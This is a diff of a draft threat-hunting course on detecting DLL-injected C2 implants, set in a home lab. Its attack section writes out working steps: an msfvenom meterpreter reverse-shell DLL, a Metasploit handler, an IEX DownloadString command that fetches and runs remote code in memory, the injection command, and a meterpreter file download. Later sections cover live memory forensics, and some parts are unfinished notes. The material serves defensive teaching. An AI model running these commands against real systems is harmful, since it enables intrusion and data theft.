@@ -10,6 +10,10 @@ author: "faan ross"
 
 # Introduction
 
+Hello, friend. Glad you're here, are you ready to have fun and learn some terrificly badass treat hunting action? Thought so.
+
+{{< figure src="/img/poe.gif" title="" class="custom-figure" >}}
+
 In this course we'll learn how to threat hunt both classical and reflective DLL-injected C2 implants. We'll do so from 3 approaches: memory forensics, log analysis + UEBA, and traffic analysis. The entire course is practically-oriented, meaning that we'll learn by doing. I'll sprinkle in a tiny bit of theory just so we are on the same page re: C2 frameworks and DLL-injection attacks; and in case you wanted to dig in deeper I provide extensive references throughout this document. 
 
 In case you're new and a little trepidated...
@@ -31,8 +35,12 @@ Here's a brief overview of what we'll be getting upto...
 - for the reflective dll-injection we'll perform the entire process using metasploit.
 
 .
-- In PART 3 we'll cover memory forensics,
+- In PART 3 we'll cover livememory forensics,
 - first we'll do a basic live read using Process Hacker,
+
+IN PART 4 we do post-mortem analysis
+
+
 - we'll then dump the memory with winpmem,
 - finally we'll have a look at the it with Volatility.
 
@@ -511,13 +519,13 @@ sudo git clone https://github.com/volatilityfoundation/volatility3.git
 
 Aaaaaaaalright! We are good to get rolling with our Attack. YEAH. There is however one more optional step, this is not required but will decrease network noise meaning when we do our log analysis we'll have a tidier dataset. I recommend doing it, it'll take about 30 seconds.
 
-For the Kali and Windows VMs repeat both these steps:
+For the Windows VMs only:
 1. Right-click on the VM in the library and select `Settings`.
 2. Go to `Network Adapter`, change to `Host-only`, hit `OK`.
 
 {{< figure src="/img/image031.png" title="" class="custom-figure" >}}
 
-That's it. And just so you are aware - we took these VMs ability to connect to the internet away, but they can still connect to one another on the local network. 
+That's it. And just so you are aware - we took this VMs ability to connect to the internet away, but it can still connect to our hacker VM on the local network. 
 
 OK. Do you know what time it is? Yeah it's time for all this installing and configuring to pay off - and we kick things off by emulating the attacker! Let's get it!
 
@@ -525,13 +533,285 @@ OK. Do you know what time it is? Yeah it's time for all this installing and conf
 
 ***
 
-# PART 2: ATTACK TIME + LIVE ANALYSIS
+# PART 2: ATTACK TIME 
 
-We'll do the two different type of attacks - standard vs. reflective loaded - seperately. First we'll do the classical injection + its live analysis. Then we'll follow that by performing the reflective loading DLL injection attack + live analysis. 
+Preamble:
+1. First things first - fire up both VMs.
+2. On our kali VM - open a terminal and run `ip a` so we can see what the ip address is. Write this down, we'll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155 **NOTE: Yours will be different!
+
+{{< figure src="/img/image032.png" title="" class="custom-figure" >}}
+
+3. Now go to the Windows VM. Open an administrative PowerShell terminal. Run `ipconfig` so we also have the ip of the victim - write this down. 
+
+{{< figure src="/img/image033.png" title="" class="custom-figure" >}}
+
+4. And now, though it's not really required, I just like to ping the Kali VM from this same terminal just to make sure the two VMs are connecting to one another on the local network. Obviously if this fails you will have to go back and troubleshoot.
+
+{{< figure src="/img/image034.png" title="" class="custom-figure" >}}
+
+5. Next we'll just create a simple text file on the desktop which will basically emulate the "nuclear codes" the threat actor is after. Right-click on the dekstop, `New` > `Text document`, give it a name and add some generic content. 
+
+{{< figure src="/img/image035.png" title="" class="custom-figure" >}}
+
+6. And the final step before we get going is starting a Wireshark pcap recording. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below. Once you've identified it, simply double-click on it, this then starts the recording. 
+
+{{< figure src="/img/image036.png" title="" class="custom-figure" >}}
+
+Great now that everything is setup let's generate our stager and transfer it over to the victim. 
+1. On our Kali VM open your terminal.
+2. We are going to run the command below, which will generate a payload for us using `msfvenom` (a standalone app that is part of the Metasploit framework). Note the following:
+- `Lhost` is the IP of the **listening** machine, ie the attacker. Yours will be different than mine here, adapt it!
+- `Lport` is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you'd like\
+- `-f` designates the file type, which of course is DLL in this case.
+- `>` indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as `evil.dll` - very subtle!
+
+```
+sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll > /home/hacker/Desktop/evil.dll
+```
+
+{{< figure src="/img/image037.png" title="" class="custom-figure" >}}
+
+3. Next we want to tranfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We'll now create a very simply http server by running a single python command (see below). Again `8008` represents an arbitrary port, feel free to choose something else
+
+```
+python3 -m http.server 8008
+```
+
+{{< figure src="/img/image038.png" title="" class="custom-figure" >}}
+
+4. Now we'll head over to the victim's system, we can either run a powershell command to download the file, or very simply open the browser (Edge) and type in the address bar write `http://[IP of hacker]:[port of http server]`, for example:
+
+{{< figure src="/img/image039.png" title="" class="custom-figure" >}}
+
+5. As you can see in the image above, you should see the dll file. If you don't, you either did not generate it, OR most likely you are not running the http server from the same directory. Now simply right-click on the DLL, `Save link as`, and in my case I will save it to desktop. Note that Edge may block the download, for example: 
+
+{{< figure src="/img/image040.png" title="" class="custom-figure" >}}
+
+If this is the case, click on the three dots `...` to the right of this message (More actions), and select `Keep`. You'll be confronted with another warning, select `Show more`, then `Keep anyway`. That should have finally done the trick!
+
+{{< figure src="/img/image042.png" title="" class="custom-figure" >}}
+
+Ok, we now have our malicious DLL on the victim's disk. 
+
+6. So as we shared in the theory section of this course, this initial stager does one thing (at least on main thing): it calls back to the attacking machine to establish a connection and put in motion the subsequent series of events. But we can't run it just yet since we need something on our attacking machine that is actually listening and awaiting that call, ie the handler. So let's head over to our Kali VM, and in the terminal we'll run the following commands:
+- `msfconsole`: this will open our metasploit console. 
+- ` use exploit/multi/handler`: this sets up a generic payload handler inside the Metasploit framework. The `multi` in the command denotes that this is a handler that can be used with any exploit module, as it is not specific to any particular exploit or target system. The `handler` part of the command tells Metasploit to wait for incoming connections from payloads. Once the exploit is executed on the target system, the payload will create a connection back to the handler which is waiting for the incoming connection.
+- `set payload windows/meterpreter/reverse_tcp`:  tells Metasploit what payload to use in conjunction with the previously selected exploit. The payload is the code that will be executed on the target system after a successful exploit. `windows`: This tells the framework that the target system is running Windows. `meterpreter`: Meterpreter is a sophisticated payload that provides an environment for controlling, manipulating, and navigating the target machine. `reverse_tcp`: This creates a reverse TCP connection from the target system back to the attacker's system. When the payload is executed on the target system, it will initiate a TCP connection back to the attacker’s machine (where Metasploit is running).
+
+{{< figure src="/img/image043.png" title="" class="custom-figure" >}}
+
+7. We now need to set required parameters, to see which ones are required run `show options`.
+
+{{< figure src="/img/image044.png" title="" class="custom-figure" >}}
+
+We can see there are 3 required parameters. The first one `EXITFUNC` is good as is. Meaning we need only to provide values for `LHOST` and `LPORT`, which is the exact same value we provided when we generated our `msfvenom` stager in step 2 - ie the attacker IP, as well as the port we chose (**88**).
+
+8. We can now set these values with two commands:
+- `set LHOST 192.168.230.155` (Note: change IP to YOURS)
+- `set LPORT 88`
+
+{{< figure src="/img/image045.png" title="" class="custom-figure" >}}
+
+9. Now to start the listener we can use one of two commands, there's literally no difference. You can either use `run`, or `exploit`. 
+
+{{< figure src="/img/image046.png" title="" class="custom-figure" >}}
+
+So now that we have our handler listening for a callback we can go back to our Windows VM to run the code. 
+
+**Performing the standard DLL-injection**
+
+Next we need to perform a bit of Macgyvering...
+
+{{< figure src="/img/macgyver.gif" title="" class="custom-figure" >}}
+
+Here's the thing - to perform the injection we need another script which will get an actual process to inject `evil.dll` into its memory space. By far the most common and effective script to perform this is called [`Invoke-DllInjection.ps1`.](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
+
+Usually in order to run this next attack we'll use a PowerShell command to download the script [directly from the original github repo](https://github.com/PowerShellMafia/PowerSploit) and inject it directly into memory. The unfortunate thing is that this incredible artifact has not been updated in a few years, and since it's also been archived it's unlikely it ever will. 
+
+The code as it currently stands on the original repo is however broken, at least when I tried it (in multiple configurations). The good news though is I found a simple fix and have updated the script which is now being hosted on [my github repo here](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1).
+
+And thus, just so you are aware, we are going to download and inject into memory the script from my personal Github repo but **in no way whatsoever do I want to appear as taking any credit/ownership for it**. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want. 
+
+1. Back on our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 
+
+{{< figure src="/img/image047.png" title="" class="custom-figure" >}}
+
+2. Now we'll run the following command, as mentioned before: it's going to download a script hosted on a webserver and then inject it directly into memory. This is a good example of what living off the land is all about - utilizing everyday components while not leaving any residue on the hard drive. 
+
+```
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1')
+```
+
+Note that after you run it there won't be any feedback/output. In case you did not know this is almost universally true: when it comes to PowerShell, not receiving any feedback/output almost always means the command ran succesfully. If there was an error, you'll get some red text telling you what went wrong. 
+
+OK so let's just hold back for a second. At this point, if you have your wits about you, you might be calling shenanigans. 
+
+{{< figure src="/img/shenanigans.gif" title="" class="custom-figure" >}}
+
+"Wait", I hear you say, "if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn't it cheating then to be running these commands ahead of that actually happening? We've now both downloaded the DLL file and run another command to download a script from a webserver and inject it into memory and it's not like the victim is going to do that for us. So what gives?"
+
+Well, here the simple answer - this is a threat hunting course. And so we are "cheating" in a sense with the goal of saving to save the time of crafting an actual spearphishing email, which if done correctly will do both the things we did here manually (ie download DLL and inject remotely-hosted script into memory). If you wanted a more realistic simulation of the Initial Compromise, well there are courses-a-plenty on it (I provide some links below), so please explore your intellecutal curiosites to your heart's complete content. But for now, we're streamling all the peripheral actions so we can focus on the heart of this course - threat hunting. 
+
+Great so the script that will inject `evil.dll` into a process memory space is now in memory. But to be clear: though we've injected that script into memory, but we've not yet executed it. We're about to do so, but before that there's one thing we need. Remeber in the beginning when I explained about how dll-injections work I said that we basically "trick" a legit process into running code from a malicious DLL. So this script is what's going to be doing the trickery, we of course have our malicious DLL which we transferred over, so taht means we only need a legit process.
+
+Now it used to be the case that you could eaasily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almopst always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you're curious to know why [see here.](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g)
+
+So as to not overcomplicate things, and because it's not really all that unrealistic to expect a non-native Windows executable to be running on a victim's system, I'll be running a portable executable called rufus.exe. It's a very small, simple program that creates bootable usb drives, but taht's irrelevant we just need some process. If you really wanted to run the same thing you can [get it here](https://rufus.ie/en/), otherwise feel free to run any other program as longs as its not a native Windows one. 
+
+3. So we will run `rufus.exe`. But since we'll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.
+
+{{< figure src="/img/image048.png" title="" class="custom-figure" >}}
+
+4. And now all the pieces are in place so we can run the actual command below. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal. 
+
+```
+Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
+```
+
+{{< figure src="/img/image049.png" title="" class="custom-figure" >}}
+
+5. We see some output, now to know if it worked let's head on back to our Kali VM. We can immediately see that we received the connection and are now in a `meterpreter` shell - success!
+
+{{< figure src="/img/image050.png" title="" class="custom-figure" >}}
+
+6. We can run a few commands if we'd like, also we'll exfiltrate the "nuclear launch codes" we created in the beginning. 
+
+```
+download C:\\Users\\user\\Desktop\\top_seekrit.txt /home/hacker/Desktop/
+```
+{{< figure src="/img/image051.png" title="" class="custom-figure" >}}
+
+Additionally, we can also drop into a `shell`.
+
+{{< figure src="/img/image052.png" title="" class="custom-figure" >}}
+
+So that's it for our attack! Let's stop our traffic packet capture:
+1. Open WireShark.
+2. Press the red STOP button.
+3. Save the file, in my case I will save it to desktop as `dllattack.pcap`.
 
 
+And while this connection is still going we'll jump right into live memory analysis. Ok so just so we don't end up just learning a bunch of "arbitraty" diagnostic properties to look out for we have to go on a brief side quest to gather some Theory Berries of Enhanced Insight that has the property of helping our party gain greater insight into what we should be looking for, and more importantly - why.
+
+***
+
+# SIDE QUEST: The theoretical berries of C2 beacon live reading
+
+{{< figure src="/img/quest02.gif" title="" class="custom-figure" >}}
+
+So here we'll discuss a few things we'll be on the lookout for that can serve as red flags. BUT, it's very important to know that there are **NO silver bullet**. There are no hard and fast rules where if we see any of the following we can be 100% sure we're dealing with malware. After all, if we could codify the rule there would be no need for us as threat hunters to do it ourselves - it would be trivial to simply write a program that does it automatically for us.
+
+Thus we'll be on the lookout for a handful of distinct signals, but these are almost always guideposts that help us figure out what needs deeper investigation. Even if somethin shows ALL the signs we list below, this would rather simply mean that we will then run further tests. For example if we see a process bearing many of these traits and we're sufficeintly suspicious we'd likely then have the SOC create a rule and scan the rest of the network. If we for example use **Least Frequency Analysis** and we see the process only occurs on one or two system - well yeah then it's time to get in touch with DFIR. 
+
+Here's a quick overview of our list:
+1. Parent-Child relationships
+2. Signature - is it valid + who signed?
+3. Current directory
+4. Command-line arguments 
+5. Thread Start Address
+6. Memory Permissions
+7. Memory Content
+
+Note that 1-4 are not unique to dll-injections, but malware in general. Conversely, 5-7 are characteristics we expect only to see related to dll-injections. 
+
+**Parent-Child relationships**
+- As we know there exists a tree-like relationship between processes in Windows, meaning an existing process (called the Parent), tpyically spawns other processes (called the Child).
+
+OK FINISH THIS LATER NOW UIT IS RUNNING SO LET'S RUN THROUGH HERE
+
+Note: have to review Eric Conrad and Chad Tilbury to beef out the first few
 
 
+***
 
+# PART 3: Live Memory Analysis
 
-Remmeber once all three are installed change Network adapter to host only. 
+Open Process Hacker as admin - ie right-click and select `Run as administrator`. Scroll down until you see `rufus.exe` (or whatever other legitimate process you chose to inject into). We can now look at our 7 signs.
+
+1. Parent-Child relationships
+
+{{< figure src="/img/image053.png" title="" class="custom-figure" >}}
+
+- TBH even though I said there is no silver bullet, nothing that can lead to 100% certainty, this first sign is HIGHLY SUSPECT. Why?
+- Well first off we can see `rufus`, and then that it itself spawned `rundll32.exe`.
+- There's two things suspect about this. 
+- First, we know that `rundll32.exe` is legitimate Windows process used to launch DLLs. But, since we also know that `rufus` is used to create bootable USB drives we have to ask ourselves: why on earth would this need to run `rundll32.exe`? Logically it makes no sense, and if we Google for example `rufus.exe spawn rundll32.exe` and there are no clean hits, well it certainly raises suspicion.
+- Further, `rundll32.exe` itself is often invovled in malware for a number of reasons - it can be used to execute malicious code concealed in a DLL, it can be used for persistence by associating itself with a DLL and a commonly-called function, and `rundll32.exe` can be misused to initiate or maintain communication with the C2 server. 
+- Further it is also very often associated with the most popular C2 framework for advanced groups - `Cobalt Strike`. Why? Simply because Raphael Mudge, the creator of the Cobalt Strike, decided to name the default dll spawned by `rundll32.exe`. Though this can be renamed in the Cobalt Strike config, it turns out, perhaps somewhat surprisingly; that most hackers don't do this. So more than 50% if Cobalt Strike is present on your system you'd expect to see `rundll32.exe`.
+- All this to say: it's sus to see `rufus` spawning `rundll32.exe`, the fact that it is itself `rundll32.exe` is even more sus, but HOLY SMOKES the most sketchy thing of all is what we see in the next relationship - `rundll32.exe` spawning `cmd.exe`.
+- I just said before that `rundll32.exe` is typically used to launch DLLs. Thus there is **very** little reason for us to expect it to be spawning the Windows command line interpreter `cmd.exe`. Now it could be that some amateur developer wrote some janky code that does this as some workaround, but in honesty if you see this you should get ready to dig in deeper. So let's do that by double-clicking on `rundll32.exe` to bring up its properties.
+
+2. Signature - is it valid + who signed?
+
+{{< figure src="/img/image054.png" title="" class="custom-figure" >}}
+
+- We can see here that it has a valid signature signed by Microsoft, since of course they are the creators of rundll32.exe.
+
+3. Current directory
+- On the same image we can see the **Current directory**, that is the "working directory" of the process, which is the directory where the process was started from or where it is operating.
+- We can see here that the Current directory is the Desktop since that's where it was initiated from. 
+- Now this could happen with legitimate scripts or applications that are using rundll32.exe to call a DLL function.
+- However, seeing rundll32.exe being called from an unusual location like a user's desktop could be suspicious, particularly if it's coupled with other strange behavior. 
+
+4. Command-line arguments 
+- And again in reference to the same image once more we see that the **Command-line** is `rundll32.exe`. 
+- This is actually very unusual - the `rundll32.exe`` command is typically used to execute a function in a specific DLL file, and thus, you would normally see it accompanied by arguments specifying the DLL file and function it's supposed to execute. 
+- For example, a legitimate command might look something like this: `rundll32.exe shell32.dll,Control_RunDLL`.
+- Thus it being "nude" can certainly be seen as another point for Team Suspect.
+
+5. Thread Start Address
+- In the top of the Properties window select `Threads`.
+{{< figure src="/img/image055.png" title="" class="custom-figure" >}}
+- We can see under `Start address` that it is mapped, meaning it does exist on disk.
+- So this just tells us that this is not a Reflectively Loaded DLL, since we would expect that to have an unknown address listed as `0x0`.
+
+6. Memory Permissions
+- In the top of the Properties window select `Memory`.
+- Now click once on the `Protection` header to sort it. 
+- Scroll down until you see `RWX` permissions, that is of course if it exists.
+{{< figure src="/img/image056.png" title="" class="custom-figure" >}}
+- And indeed we see the presence of two memory spaces with **Read-Write-Execute** permissions, which as we learned is always unusual/suspect.
+
+7. Memory Content
+- Finally let's double-click on the larger of the two (172 kB) since this typically represents the payload.
+{{< figure src="/img/image057.png" title="" class="custom-figure" >}}
+- And immediately we can see two clear giveaways that we are dealing with a PE file: first we see the magic bytes (`MZ`), and we see the strings we associate with a PE Dos Stub - `This program cannot be run in DOS mode`.
+- So once again it seems suspect. 
+
+That's it for our live analysis: feel free to exit Process Hacker. Let's discuss our results before dumping the memory and moving on to our post-mortem analysis. 
+
+ANALYSIS
+add a table here
+review results, conclusions we can come to, next steps etc.
+
+**Memory Dump**
+One final thing before we kill the connection and start our post-mortem analysis: we need to dump the memory. 
+1. Open a `Command Prompt` as administrator. 
+2. Navigate to the directory where you saved `winpmem`.
+3. We'll run the following command, meaning it will dump the memory and save it as `memdump.raw` in our present directory
+
+```
+winpmem.exe memdump.raw
+```
+
+Feel free to shut down the Kali VM - this will of course kill the connection but for now that's not an issue since we have everything we need: a memory dump, a traffic packet capture, and logs (WEL, PowerShell, Sysmon). 
+
+***
+
+# PART 4: Post-Mortem Memory Analysis
+
+First is we would like to
+
+Once these settings are enabled, PowerShell logs can be found in the Event Viewer at the following location:
+
+"Applications and Services Logs" -> "Microsoft" -> "Windows" -> "PowerShell" -> "Operational"
+
+Remember, accessing and changing Group Policy settings, and viewing Event Logs, will typically require administrative permissions.
+
+After you've found the logs in the Event Viewer, you can save them for transfer and analysis. You can right-click on the "Operational" log (or any other log) and select "Save All Events As..." to save the logs as an .evtx file. This file can then be opened in the Event Viewer on another machine for analysis.
+
+Windows Event Logs (WEL): Windows Event Logs are not stored as simple text files, but rather as .evtx files. These files can be found in the %SystemRoot%\System32\Winevt\Logs\ directory. This usually translates to C:\Windows\System32\winevt\Logs\. Notably important files may include "System.evtx", "Application.evtx", and "Security.evtx", among others.
+
+Sysmon Logs: Sysmon (System Monitor) logs are actually part of the Windows Event Logs. After installing Sysmon, its logs are stored as "Microsoft-Windows-Sysmon/Operational" under the Applications and Services Logs in the Event Viewer. You can export these logs to .evtx or .csv file format from the Event Viewer.
+
+then also we'll transfer dllatack.pcap and memdump.raw
